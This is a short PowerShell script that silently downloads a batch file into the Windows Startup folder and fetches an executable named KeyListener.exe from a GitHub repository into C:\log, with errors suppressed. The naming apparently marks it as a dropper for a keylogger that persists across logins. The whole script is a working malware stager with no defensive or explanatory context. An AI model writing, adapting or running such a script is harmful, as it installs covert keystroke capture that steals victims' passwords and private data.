# Download start.bat to Startup folder
$startBatUrl = "https://raw.githubusercontent.com/kentcarloestillore/script-kl/main/start.bat"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
Invoke-WebRequest -Uri $startBatUrl -OutFile $startupPath -UseBasicParsing -ErrorAction SilentlyContinue

# Create C:\log folder if it doesn't exist
$logDir = "C:\log"
if (-not (Test-Path $logDir)) {
    New-Item -Path $logDir -ItemType Directory -Force | Out-Null
}

# Download App.exe to C:\log
$appExeUrl = "https://raw.githubusercontent.com/kentcarloestillore/script-kl/main/KeyListener.exe"
$appExePath = Join-Path $logDir "KeyListener.exe"
Invoke-WebRequest -Uri $appExeUrl -OutFile $appExePath -UseBasicParsing -ErrorAction SilentlyContinue
